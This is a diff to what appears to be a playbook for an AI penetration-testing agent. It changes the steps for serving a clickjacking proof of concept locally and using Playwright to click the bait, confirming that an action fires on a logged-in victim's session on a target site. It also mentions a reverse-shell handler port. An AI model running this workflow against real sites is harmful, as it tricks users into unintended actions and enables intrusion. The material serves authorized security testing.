@@ -154,7 +154,7 @@ In WebViews, framing is often unprotected because XFO is HTTP-only. Combine with
 </body></html>
 ```
 
-Host on attacker.tld (or `python3 -m http.server 8000` locally). Visit while logged in as the victim. Click the bait. Verify the action fired on target.tld.
+Serve it locally for the sandbox's own browser to visit — this is a loopback-only PoC, so any free port works (avoid 8000-8016 and 4040, the sandbox's own services, and 4444, your reverse handler port). Start python ALONE in the background with every stream redirected, or kali_shell waits until its timeout: `python3 -m http.server 8888 --directory /tmp/clickjack_poc >/tmp/clickjack.srv.log 2>&1 </dev/null & echo $!`, and `kill` that PID when done. Visit while logged in as the victim. Click the bait. Verify the action fired on target.tld.
 
 ```
 execute_code language: python
@@ -165,14 +165,14 @@ os.makedirs("/tmp/clickjack_poc", exist_ok=True)
 with open("/tmp/clickjack_poc/index.html", "w") as f:
     f.write(PAYLOAD)
 print("PoC at /tmp/clickjack_poc/index.html. Serve via:")
-print("  cd /tmp/clickjack_poc && python3 -m http.server 8000")
+print("  python3 -m http.server 8888 --directory /tmp/clickjack_poc >/tmp/clickjack.srv.log 2>&1 </dev/null & echo $!")
 ```
 
 Then drive the browser at the PoC:
 
 ```
-execute_playwright url: "http://localhost:8000/" script: |
-  page.goto("http://localhost:8000/")
+execute_playwright url: "http://localhost:8888/" script: |
+  page.goto("http://localhost:8888/")
   page.wait_for_timeout(2000)
   # Manually click the bait, or for automated proof:
   page.click(".bait")
